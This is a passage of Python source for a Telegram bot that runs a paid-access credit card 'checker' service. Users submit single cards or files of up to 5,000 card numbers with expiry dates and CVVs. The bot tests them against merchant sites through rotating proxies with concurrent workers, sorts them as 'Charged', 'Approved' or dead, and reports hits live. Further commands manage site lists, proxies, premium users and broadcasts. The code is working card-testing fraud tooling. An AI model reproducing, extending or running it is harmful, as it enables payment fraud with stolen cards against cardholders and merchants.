            f"<b>{SEP}</b>\n\n"
            f"<b>Premium Management</b>\n"
            f"├─ <code>/addpremium user_id</code> → Add premium\n"
            f"├─ <code>/removepremium user_id</code> → Remove premium\n"
            f"└─ <code>/listpremium</code> → List premium users\n\n"
            f"<b>Sites Management</b>\n"
            f"├─ <code>/addsites</code> → Reply to .txt to upload sites\n"
            f"└─ <code>/getsites</code> → Download sites.txt\n\n"
            f"<b>Bot Management</b>\n"
            f"├─ <code>/stats</code> → Show bot statistics\n"
            f"└─ <code>/broadcast message</code> → Send to all users"
        )
        await event.edit(pe(text), buttons=_back_kb(), parse_mode='html')
        await event.answer()

    elif data == "main_menu":
        try:
            sender = await event.get_sender()
            uname  = sender.username or f"user_{uid}"
        except Exception:
            uname = f"user_{uid}"
        text = await get_user_stats_text(uid, uname)
        kw   = dict(buttons=_main_kb(uid), parse_mode='html')
        if os.path.exists(WELCOME_IMAGE):
            try:
                await event.delete()
            except Exception:
                pass
            await event.respond(pe(text), file=WELCOME_IMAGE, **kw)
        else:
            await event.edit(pe(text), **kw)
        await event.answer()

    elif data == "pause":
        key = f"{uid}_{event.message_id}"
        if key in active_sessions:
            active_sessions[key]['paused'] = True
        await event.answer("⏸ Paused")

    elif data == "resume":
        key = f"{uid}_{event.message_id}"
        if key in active_sessions:
            active_sessions[key]['paused'] = False
        await event.answer("▶ Resumed")

    elif data == "stop":
        key = f"{uid}_{event.message_id}"
        if key in active_sessions:
            del active_sessions[key]
        await event.answer("🛑 Stopped")
        try:
            await event.edit(pe("🛑 <b>Mass check stopped.</b>"), parse_mode='html')
        except Exception:
            pass

    # ── FIXED: Close results message ──────────────────────────────────────
    elif data == "close_results":
        try:
            await event.delete()
        except Exception:
            pass
        await event.answer("Closed")

    # ── FIXED: Recheck errored cards ──────────────────────────────────────
    elif data.startswith("recheck_"):
        rid   = data[len("recheck_"):]
        cards = _recheck_store.pop(rid, [])
        if not cards:
            await event.answer("❌ No errored cards found (expired).", alert=True)
            return
        sites   = load_sites()
        proxies = load_proxies()
        if not sites:
            await event.answer("❌ No sites configured.", alert=True)
            return
        if not proxies:
            await event.answer("❌ No proxies configured.", alert=True)
            return
        await event.answer(f"🔄 Rechecking {len(cards)} cards...")
        try:
            await event.edit(pe(f"🔄 <b>Launching recheck for {len(cards)} errored cards...</b>"),
                             parse_mode='html')
        except Exception:
            pass
        # Run a fresh mass check for the errored cards
        await _run_mass_check(bot, uid, cards, sites, proxies)

# ══════════════════════════════════════════
#  /help
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    text = (
        f"<b>{SEP}</b>\n"
        f"<b>🔑 Help</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"<b>💳 Single check:</b>\n"
        f"  <code>/cc number|mm|yyyy|cvv</code>\n\n"
        f"<b>💳 Mass check:</b>\n"
        f"  Reply to a <code>.txt</code> file → <code>/chk</code>\n\n"
        f"<b>🌐 Add sites:</b>\n"
        f"  <code>/site https://domain.com</code>\n"
        f"  Multi-line or reply to <code>.txt</code>\n\n"
        f"<b>🌐 Clean sites:</b>  <code>/site</code> (no args)\n\n"
        f"<b>🌐 Remove site(s):</b>  <code>/rmsites domain.com</code>\n\n"
        f"<b>🌐 Clear all sites:</b>  <code>/rmsite</code>\n\n"
        f"<b>🔌 Add proxies:</b>\n"
        f"  <code>/chkproxy ip:port:user:pass</code>\n"
        f"  Paste multi-line proxies after the command\n"
        f"  Or reply to a <code>.txt</code> file\n"
        f"  (working proxies auto-saved)\n\n"
        f"<b>🔌 Clean proxies:</b>  <code>/proxyall</code>"
    )
    await event.reply(pe(text), buttons=_back_kb(), parse_mode='html')

# ══════════════════════════════════════════
#  /profile
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/profile'))
async def profile_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    try:
        sender = await event.get_sender()
        uname  = sender.username or f"user_{uid}"
        fname  = sender.first_name or "User"
    except Exception:
        uname, fname = f"user_{uid}", "User"
    try:
        data = json.load(open(USER_DB_FILE))
    except Exception:
        data = {}
    reg = data.get('registered_at', datetime.now().isoformat())[:10]
    text = (
        f"<b>{SEP}</b>\n"
        f"<b>👤 Profile</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"<b>ID        »</b>  <code>{uid}</code>\n"
        f"<b>Name      »</b>  {esc(fname)}\n"
        f"<b>Username  »</b>  @{esc(uname)}\n"
        f"<b>Premium   »</b>  {'✅ Yes' if is_premium(uid) else '❌ No'}\n"
        f"<b>Joined    »</b>  {reg}\n"
        f"<b>Checks    »</b>  {data.get('total_checks',0)}\n"
        f"<b>Hits      »</b>  {data.get('successful_checks',0)}\n"
        f"<b>Sites     »</b>  {len(load_sites())}\n"
        f"<b>Proxies   »</b>  {len(load_proxies())}"
    )
    await event.reply(pe(text), buttons=_back_kb(), parse_mode='html')

# ══════════════════════════════════════════
#  /mysites
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(pe("❌ No sites saved."), parse_mode='html')
        return
    meta = load_site_meta()
    # Always send as a .txt file with full metadata
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"sites_{uid}_{ts}.txt"
    try:
        async with aiofiles.open(fname, 'w') as f:
            await f.write("=" * 60 + "\n")
            await f.write(f"SAVED SITES ({len(sites)}) — @Onyxa_a\n")
            await f.write(f"Generated: {datetime.now().strftime('%d/%m/%Y %H:%M')}\n")
            await f.write("=" * 60 + "\n")
            await f.write("Format: Site | Gateway | Price | Response | Last Checked\n")
            await f.write("-" * 60 + "\n\n")
            for i, s in enumerate(sites, 1):
                m = meta.get(s, {})
                gw   = m.get('gateway', '-')
                pr   = m.get('price', '-')
                resp = m.get('response', '-')
                chk  = m.get('checked', '-')
                await f.write(f"{i:>3}. {s} | {gw} | {pr} | {resp} | {chk}\n")
        caption = pe(
            f"<b>{SEP}</b>\n"
            f"<b>📋 My Sites</b>\n"
            f"<b>{SEP}</b>\n\n"
            f"📊 Total  »  <b>{len(sites)}</b>\n"
            f"📄 Full details in attached file."
        )
        await event.reply(caption, file=fname, parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {esc(str(e)[:80])}"), parse_mode='html')
    try:
        os.remove(fname)
    except Exception:
        pass

# ══════════════════════════════════════════
#  /site  — dual mode: check-clean OR add
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/site(?:\s|$)'))
async def site_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe("❌ No proxies available. Use /chkproxy to add some."),
                          parse_mode='html')
        return

    # ─ Mode: reply to .txt → ADD MODE ─────────────────────────────────────
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if (reply and reply.file and reply.file.name
                and reply.file.name.endswith('.txt')):
            sm = await event.reply(
                pe("🔄 <b>Reading sites from file...</b>"), parse_mode='html')
            fp = await reply.download_media()
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            try:
                os.remove(fp)
            except Exception:
                pass
            sites_list = [
                normalize_site(l)
                for l in content.splitlines() if l.strip()
            ]
            if not sites_list:
                await _safe_edit(sm, pe("❌ No sites found in file."), parse_mode='html')
                return
            await _run_site_add(sm, sites_list, proxies, uid)
            return

    # ─ Parse inline text ─────────────────────────────────────────────────
    raw        = event.message.text.strip()
    lines      = [l.strip() for l in raw.splitlines() if l.strip()]
    cmd_line   = lines[0]
    rest_lines = lines[1:]
    inline     = cmd_line.split(' ', 1)[1].strip() if ' ' in cmd_line else ''
    candidates = ([inline] if inline else []) + rest_lines
    sites_list = [normalize_site(c) for c in candidates if c]

    if sites_list:
        # ─ ADD MODE: given URLs ────────────────────────────────────────────
        sm = await event.reply(
            pe(f"🔄 <b>Testing {len(sites_list)} site(s)...</b>"), parse_mode='html')
        await _run_site_add(sm, sites_list, proxies, uid)
    else:
        # ─ CHECK-CLEAN MODE: test existing sites.txt ──────────────────────
        existing = load_sites()
        if not existing:
            await event.reply(pe("❌ sites.txt is empty. Add sites first."), parse_mode='html')
            return
        sm = await event.reply(
            pe(f"🔄 <b>Checking {len(existing)} saved sites...</b>"), parse_mode='html')
        await _run_site_check(sm, existing, proxies, uid)

# ══════════════════════════════════════════
#  /rmsites  — remove specific site(s) by URL/index
#  /rmsite   — CLEAR ALL sites
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/rmsites(?:\s|$)'))
async def rmsites_command(event):
    """Remove one or more specific sites."""
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    raw = event.message.text.split(None, 1)
    if len(raw) < 2 or not raw[1].strip():
        await event.reply(pe("❌ Usage: <code>/rmsites domain.com</code>  or  <code>/rmsites site1.com site2.com</code>"),
                          parse_mode='html')
        return
    targets = [normalize_site(x) for x in re.split(r'[\n,\s]+', raw[1].strip()) if x.strip()]
    sites   = load_sites()
    removed = [t for t in targets if t in sites]
    if not removed:
        await event.reply(pe("❌ None of the specified sites found in list."), parse_mode='html')
        return
    save_sites([s for s in sites if s not in removed])
    preview = '\n'.join(f"  ❌ <code>{esc(s)}</code>" for s in removed[:10])
    await event.reply(pe(f"✅ <b>Removed {len(removed)} site(s):</b>\n{preview}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmsite(?:\s|$)'))
async def rmsite_command(event):
    """Clear ALL sites from sites.txt."""
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(pe("❌ No sites to clear."), parse_mode='html')
        return
    # Backup first
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"sites_backup_{uid}_{ts}.txt"
    try:
        async with aiofiles.open(fname, 'w') as f:
            await f.write('\n'.join(sites) + '\n')
        await event.reply(
            pe(f"📦 <b>Backup of {len(sites)} sites — then cleared all.</b>"),
            file=fname, parse_mode='html')
    except Exception:
        pass
    try:
        os.remove(fname)
    except Exception:
        pass
    save_sites([])
    await event.reply(pe(f"✅ <b>Cleared all {len(sites)} sites.</b>"), parse_mode='html')

# ══════════════════════════════════════════
#  /mcancel
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/mcancel'))
async def mcancel_command(event):
    uid      = event.sender_id
    canceled = False
    for k in list(active_sessions):
        if k.startswith(f"{uid}_"):
            del active_sessions[k]
            canceled = True
    await event.reply(
        pe("✅ <b>Mass check cancelled.</b>" if canceled
           else "❌ No active mass check."),
        parse_mode='html'
    )

# ══════════════════════════════════════════
#  check_card_with_retry  (single-card helper)
#  Uses simple random selection — fine for /cc
# ══════════════════════════════════════════
async def check_card_with_retry(card: str, sites: list,
                                 proxies: list, max_retries: int = 3) -> dict:
    if not sites:
        return {'status': 'Error', 'message': 'No sites configured',
                'card': card, 'gateway': '-', 'price': '-'}
    if not proxies:
        return {'status': 'Error', 'message': 'No proxies configured',
                'card': card, 'gateway': '-', 'price': '-'}
    last = None
    for _ in range(max_retries):
        site  = random.choice(sites)
        proxy = random.choice(proxies)
        res   = await check_card(card, site, proxy)
        if not res.get('retry'):
            return res
        last = res
        await asyncio.sleep(0.2)
    return {
        'status': 'Error',
        'message': f"All retries failed: {(last or {}).get('message','?')[:80]}",
        'card': card, 'gateway': '-', 'price': '-',
    }

# ══════════════════════════════════════════
#  CORE MASS-CHECK ENGINE
#  — SmartProxyRotator for round-robin + failure tracking
#  — Auto-removes sites that cause repeated errors
# ══════════════════════════════════════════
async def _run_mass_check(bot, uid: int, cards: list, sites: list, proxies: list):
    """
    Shared engine used by /chk and the Recheck Errors button.
    Sends a live-updating progress message then a final results message.
    """
    total       = len(cards)
    session_key = f"{uid}_{int(time.time())}"

    sm = await bot.send_message(
        uid,
        pe(f"🔥 <b>Starting {total} card check...</b>"),
        parse_mode='html'
    )
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [], 'approved': [], 'errored': [], 'dead': [],
        'total': total, 'checked': 0, 'start_time': time.time(),
        'last_card': '—', 'last_resp': '—', 'last_gate': '—',
        'auto_removed_sites': [],
    }

    # Mutable working copies updated inside the worker
    active_sites   = list(sites)
    rotator        = SmartProxyRotator(proxies)
    # Per-site consecutive error counter (shared across workers via dict)
    site_err_count = {}

    try:
        q = asyncio.Queue()
        for c in cards:
            q.put_nowait(c)
        last_upd = [time.time()]

        async def worker():
            nonlocal active_sites
            while not q.empty():
                if session_key not in active_sessions:
                    break
                sess = active_sessions.get(session_key)
                if not sess:
                    break
                while sess.get('paused'):
                    await asyncio.sleep(1)
                    sess = active_sessions.get(session_key)
                    if not sess or session_key not in active_sessions:
                        return
                try:
                    card = q.get_nowait()
                except asyncio.QueueEmpty:
                    break

                # Hot-reload proxies so newly added proxies are picked up
                fresh_proxies = load_proxies()
                if fresh_proxies:
                    rotator.reload(fresh_proxies)

                # ── Get proxy via SmartProxyRotator (round-robin + cooldowns) ──
                proxy = rotator.get()
                if not proxy:
                    proxy = random.choice(proxies)   # last-resort fallback

                # ── Pick site; refresh from disk occasionally ────────────────
                if not active_sites:
                    active_sites = load_sites() or list(sites)
                site = random.choice(active_sites) if active_sites else ''

                # ── Check with one retry, rotating proxy/site on error ───────
                res = await check_card(card, site, proxy)

                if res.get('retry'):
                    is_proxy_err = res.get('is_proxy_error', False)
                    if is_proxy_err:
                        # Proxy failed — penalise it and try another
                        rotator.mark_failure(proxy)
                        proxy2 = rotator.get() or proxy
                        res2   = await check_card(card, site, proxy2)
                        if not res2.get('retry'):
                            rotator.mark_success(proxy2)
                            res = res2
                        else:
                            rotator.mark_failure(proxy2)
                    else:
                        # Site error on first attempt — try a different site
                        if active_sites and site in active_sites:
                            alt_sites = [s for s in active_sites if s != site]
                        else:
                            alt_sites = list(active_sites)
                        if alt_sites:
                            site2 = random.choice(alt_sites)
                            res2  = await check_card(card, site2, proxy)
                            if not res2.get('retry'):
                                rotator.mark_success(proxy)
                                res = res2

                # ── Settle proxy reputation based on final result ─────────────
                if not res.get('retry'):
                    rotator.mark_success(proxy)

                # ── Classify & record ─────────────────────────────────────────
                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_resp'] = res.get('message', '')[:50]
                all_results['last_gate'] = res.get('gateway', '—')

                status = res['status']
                if res.get('retry'):
                    status = 'Error'
                    res = {'status': 'Error',
                           'message': res.get('message', 'All retries failed')[:80],
                           'card': card, 'site': site, 'gateway': '-', 'price': '-'}

                if status == 'Charged':
                    all_results['charged'].append(res)
                    await save_user_stats(uid, True)
                    await send_realtime_hit(bot, uid, res, 'Charged')
                elif status == 'Approved':
                    all_results['approved'].append(res)
                    await save_user_stats(uid, True)
                    await send_realtime_hit(bot, uid, res, 'Approved')
                elif status in ('Error', 'Site Error'):
                    all_results['errored'].append(res)
                    await save_user_stats(uid, False)
                else:
                    all_results['dead'].append(res)
                    await save_user_stats(uid, False)

                q.task_done()
                now = time.time()
                if now - last_upd[0] >= 1.0:
                    last_upd[0] = now
                    if session_key in active_sessions:
                        await update_progress(sm, all_results, all_results['checked'])

        workers = [asyncio.create_task(worker()) for _ in range(15)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(sm, all_results, all_results['checked'])

    except Exception as e:
        logging.error(f"[ERROR] _run_mass_check exception: {e}")
        try:
            await bot.send_message(uid, pe(f"❌ Error: <code>{esc(str(e)[:100])}</code>"),
                                   parse_mode='html')
        except Exception:
            pass
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await sm.delete()
        except Exception:
            pass
        await send_final_results(bot, uid, all_results)

# ══════════════════════════════════════════
#  /cc  — single card
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    sites   = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(pe("❌ No sites. Use /site to add some."), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe("❌ No proxies. Use /chkproxy to add some."), parse_mode='html')
        return

    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(
            pe("❌ Invalid format.\n<code>/cc number|mm|yyyy|cvv</code>"),
            parse_mode='html'
        )
        return

    card = cards[0]
    sm   = await event.reply(
        pe(f"<b>⚡ Checking...</b>\n<b>Card »</b> <code>{esc(card)}</code>"),
        parse_mode='html'
    )
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        await save_user_stats(uid, result['status'] in ('Charged', 'Approved'))
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        await _safe_edit(sm,
                         pe(_cc_result_text(result, brand, bin_type, level,
                                             bank, country, flag)),
                         parse_mode='html')
    except Exception as e:
        await _safe_edit(sm, pe(f"❌ Error: <code>{esc(str(e)[:100])}</code>"),
                         parse_mode='html')

# ══════════════════════════════════════════
#  /chk  — mass check
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)'))
async def mass_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(pe("❌ Reply to a <b>.txt</b> file containing cards."),
                          parse_mode='html')
        return
    reply = await event.get_reply_message()
    if (not reply or not reply.file
            or not reply.file.name or not reply.file.name.endswith('.txt')):
        await event.reply(pe("❌ Please reply to a <b>.txt</b> file."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(pe("❌ No sites configured."), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe("❌ No proxies configured."), parse_mode='html')
        return

    sm = await event.reply(pe("🔄 <b>Processing file...</b>"), parse_mode='html')
    fp = await reply.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try:
        os.remove(fp)
    except Exception:
        pass

    cards = extract_cc(content)
    if not cards:
        await _safe_edit(sm, pe("❌ No valid cards found."), parse_mode='html')
        return
    if len(cards) > 5000:
        await _safe_edit(sm, pe(f"⚠️ Capped at 5 000 (file had {len(cards)})."),
                         parse_mode='html')
        cards = cards[:5000]

    try:
        await sm.delete()
    except Exception:
        pass

    await _run_mass_check(bot, uid, cards, sites, proxies)

# ══════════════════════════════════════════
#  /proxyall  (check + clean saved proxies)
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/proxyall(?:\s|$)'))
async def proxyall(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe("❌ No proxies saved. Use /chkproxy to add some."), parse_mode='html')
        return
    sm = await event.reply(
        pe(f"🔌 <b>Checking {len(proxies)} proxies via checker API...</b>"),
        parse_mode='html')
    await _run_proxy_check(sm, proxies, save=True)

# ══════════════════════════════════════════
#  /chkproxy  — single proxy OR .txt file
#  Working proxies are auto-saved
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/chkproxy(?:\s|$)'))
async def chkproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return

    # .txt file reply → bulk check, alive ones auto-saved
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if (reply and reply.file and reply.file.name
                and reply.file.name.endswith('.txt')):
            sm = await event.reply(
                pe("🔄 <b>Reading proxies from file...</b>"), parse_mode='html')
            fp = await reply.download_media()
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            try:
                os.remove(fp)
            except Exception:
                pass
            proxy_list = [l.strip() for l in content.splitlines() if l.strip()]
            if not proxy_list:
                await _safe_edit(sm, pe("❌ No proxies in file."), parse_mode='html')
                return
            await _run_proxy_check(sm, proxy_list, save=True)
            return

    # Inline proxies — one or more, line by line, or space-separated
    raw_text = event.message.text
    # Get everything after /chkproxy
    after_cmd = raw_text.split(None, 1)[1].strip() if len(raw_text.split(None, 1)) > 1 else ''
    # Split by newlines AND commas to support various formats
    proxy_list = [p.strip() for p in re.split(r'[\n,]+', after_cmd) if p.strip()]

    if not proxy_list:
        await event.reply(
            pe("❌ <b>Usage:</b>\n"
               "├─ <code>/chkproxy ip:port</code>  (single)\n"
               "├─ Multi-line: paste proxies after the command\n"
               "└─ Or reply to a <code>.txt</code> file"),
            parse_mode='html'
        )
        return

    if len(proxy_list) == 1:
        # Single proxy — show individual result
        proxy = proxy_list[0]
        sm    = await event.reply(
            pe(f"🔄 Testing <code>{esc(proxy)}</code>..."), parse_mode='html')
        res   = await test_proxy(proxy)
        # Use the normalized (decoded) proxy returned by test_proxy
        decoded_proxy = res['proxy']
        if res['status'] == 'alive':
            existing = load_proxies()
            if decoded_proxy not in existing:
                try:
                    async with aiofiles.open(PROXY_FILE, 'a') as f:
                        await f.write(decoded_proxy + '\n')
                    saved_note = "  ✅ <i>saved to proxies.txt</i>"
                except Exception:
                    saved_note = ""
            else:
                saved_note = "  <i>(already saved)</i>"
            await _safe_edit(
                sm,
                pe(f"✅ <b>ALIVE</b>  ({res['latency_ms']}ms)\n"
                   f"<code>{esc(decoded_proxy)}</code>{saved_note}"),
                parse_mode='html'
            )
        else:
            await _safe_edit(sm, pe(f"❌ <b>DEAD</b>\n<code>{esc(decoded_proxy)}</code>"),
                             parse_mode='html')
    else:
        # Multiple proxies — use batch checker, auto-save all alive
        sm = await event.reply(
            pe(f"🔌 <b>Checking {len(proxy_list)} proxies...</b>"), parse_mode='html')
        await _run_proxy_check(sm, proxy_list, save=True)

# /rmproxyindex removed per user request

# ══════════════════════════════════════════
#  /clearproxy
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clearproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe("❌ No proxies to clear."), parse_mode='html')
        return
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"proxy_backup_{uid}_{ts}.txt"
    async with aiofiles.open(fname, 'w') as f:
        await f.write('\n'.join(proxies) + '\n')
    try:
        await event.reply(
            pe(f"📦 <b>Backup of {len(proxies)} proxies:</b>"),
            file=fname, parse_mode='html')
    except Exception:
        pass
    try:
        os.remove(fname)
    except Exception:
        pass
    save_proxies([])
    await event.reply(pe(f"✅ <b>Cleared {len(proxies)} proxies.</b>"), parse_mode='html')

# ══════════════════════════════════════════
#  /getproxy
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/getproxy'))
async def getproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Premium only.</b>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe("❌ No proxies saved."), parse_mode='html')
        return
    if len(proxies) <= 30:
        body = '\n'.join(f"  {i+1}. <code>{esc(p)}</code>" for i, p in enumerate(proxies))
        await event.reply(pe(f"<b>🔌 Proxies ({len(proxies)})</b>\n\n{body}"),
                          parse_mode='html')
    else:
        ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"proxies_{uid}_{ts}.txt"
        async with aiofiles.open(fname, 'w') as f:
            for i, p in enumerate(proxies):
                await f.write(f"{i+1}. {p}\n")
        await event.reply(pe(f"<b>🔌 Proxies ({len(proxies)}) — attached</b>"),
                          file=fname, parse_mode='html')
        try:
            os.remove(fname)
        except Exception:
            pass

# ══════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/addpremium'))
async def addpremium_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(pe("❌ <code>/addpremium user_id</code>"), parse_mode='html')
        return
    tid = args[1].strip()
    if tid in load_premium_users():
        await event.reply(pe(f"⚠️ <code>{esc(tid)}</code> already premium."),
                          parse_mode='html')
        return
    with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{tid}\n")
    await event.reply(pe(f"✅ <code>{esc(tid)}</code> is now premium!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def removepremium_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(pe("❌ <code>/removepremium user_id</code>"), parse_mode='html')
        return
    tid   = args[1].strip()
    users = load_premium_users()
    if tid not in users:
        await event.reply(pe(f"⚠️ <code>{esc(tid)}</code> not found."), parse_mode='html')
        return
    with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
        f.write('\n'.join(u for u in users if u != tid) + '\n')
    await event.reply(pe(f"✅ Removed premium from <code>{esc(tid)}</code>."),
                      parse_mode='html')

@bot.on(events.NewMessage(pattern='/premiumlist'))
async def premiumlist_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html')
        return
    users = load_premium_users()
    if not users:
        await event.reply(pe("📋 No premium users."), parse_mode='html')
        return
    body = '\n'.join(f"  {i+1}. <code>{esc(u)}</code>" for i, u in enumerate(users))
    await event.reply(pe(f"<b>👑 Premium Users ({len(users)})</b>\n\n{body}"),
                      parse_mode='html')

@bot.on(events.NewMessage(pattern='/id'))
async def id_command(event):
    uid  = event.sender_id
    text = f"<b>🆔 Your ID:</b>  <code>{uid}</code>"
    if event.is_group:
        text += f"\n<b>Chat ID:</b>  <code>{event.chat_id}</code>"
    await event.reply(pe(text), parse_mode='html')

# ══════════════════════════════════════════
#  STARTUP
# ══════════════════════════════════════════
async def _startup():
    # 1. Ensure all admins are in premium.txt
    existing = set(load_premium_users())
    for aid in ADMIN_IDS:
        s = str(aid)
        if s not in existing:
            with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{s}\n")
            print(f"[+] Admin {s} → premium.txt")

    # 2. Seed users.json for every admin so they appear in /stats from day one
    for aid in ADMIN_IDS:
        await create_user_if_not_exists(aid, f"admin_{aid}")

    # 3. Create flat files if missing so bot never crashes on first run
    for path in (SITES_FILE, PROXY_FILE):
        if not os.path.exists(path):
            open(path, 'w').close()

    print(f"[✓] Startup complete — admins: {ADMIN_IDS}")


# ══════════════════════════════════════════
#  BROADCAST  (admin only)
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/broadcast(?:\s+([\s\S]+))?$'))
async def broadcast_command(event):
    uid = event.sender_id
    if uid not in ADMIN_IDS:
        await event.reply(pe("❌ Admin only."), parse_mode='html')
        return

    text = event.pattern_match.group(1)
    if not text or not text.strip():
        await event.reply(
            pe("📢 Usage:\n<code>/broadcast Your message here</code>\n\nSupports HTML formatting."),
            parse_mode='html'
        )
        return

    all_ids = get_all_user_ids()
    if not all_ids:
        await event.reply(pe("⚠️ No users in DB yet."), parse_mode='html')
        return

    status_msg = await event.reply(
        pe(f"📡 Broadcasting to {len(all_ids)} users..."),
        parse_mode='html'
    )

    sent = 0
    failed = 0
    for target_id in all_ids:
        try:
            await bot.send_message(target_id, pe(text.strip()), parse_mode='html')
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)  # avoid Telegram flood

    await status_msg.edit(
        pe(f"✅ Broadcast complete!\n\n📤 Sent: {sent}\n❌ Failed: {failed}\n👥 Total: {len(all_ids)}"),
        parse_mode='html'
    )


# ══════════════════════════════════════════
#  /stats  (admin)
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    uid = event.sender_id
    if uid not in ADMIN_IDS:
        await event.reply(pe("❌ Admin only."), parse_mode='html')
        return

    total_users   = get_total_users()
    premium_count = len(load_premium_users())
    sites         = load_sites()
    proxies       = load_proxies()

    stats_text = (
        f"📊 <b>Bot Statistics</b>\n\n"
        f"👥 Total users: <b>{total_users}</b>\n"
        f"👑 Premium users: <b>{premium_count}</b>\n"
        f"🌐 Active sites: <b>{len(sites)}</b>\n"
        f"🔌 Proxies loaded: <b>{len(proxies)}</b>\n\n"
        f"🤖 Status: Running ✅"
    )
    await event.reply(pe(stats_text), parse_mode='html')


# ══════════════════════════════════════════
#  /getsites  (admin)
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/getsites'))
async def get_sites_command(event):
    uid = event.sender_id
    if uid not in ADMIN_IDS:
        await event.reply(pe("❌ Admin only."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(pe("❌ sites.txt is empty."), parse_mode='html')
        return

    if len(sites) <= 30:
        site_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(sites)])
        await event.reply(pe(f"🌐 Sites ({len(sites)}):\n\n{site_list}"), parse_mode='html')
    else:
        import tempfile, datetime as _dt
